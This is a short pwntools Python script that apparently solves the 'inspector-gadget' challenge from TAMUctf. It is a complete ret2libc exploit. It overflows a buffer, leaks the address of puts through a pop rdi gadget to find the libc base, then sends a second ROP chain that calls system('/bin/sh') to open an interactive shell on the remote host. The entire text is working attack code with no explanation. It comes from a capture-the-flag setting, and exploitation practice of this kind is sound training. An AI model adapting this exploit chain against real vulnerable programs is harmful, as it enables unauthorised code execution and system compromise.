from pwn import *

p = remote("tamuctf.com", 443, ssl=True, sni="inspector-gadget")
elf = ELF("./inspector-gadget")
libc = ELF("./libc.so.6")

pop_rdi = 0x000000000040127b
ret = 0x0000000000401016

#leak libc
padding = 24*b"A"
payload = padding + p64(pop_rdi) + p64(elf.got.puts) + p64(elf.plt.puts) + p64(elf.sym.main)
p.sendline(payload)
p.recvuntil(b"pwn me")
p.recvline()
leak = u64(p.recvline().strip().ljust(8, b"\x00"))
libc.address = leak - libc.sym.puts
info(f"libc base @ {hex(libc.address)}")

# craft payload -> system("/bin/sh")
system = libc.sym.system
bsh = libc.address + 0x18052c

payload = padding + p64(pop_rdi) + p64(bsh) + p64(ret) + p64(system)
p.sendline(payload)

p.interactive()
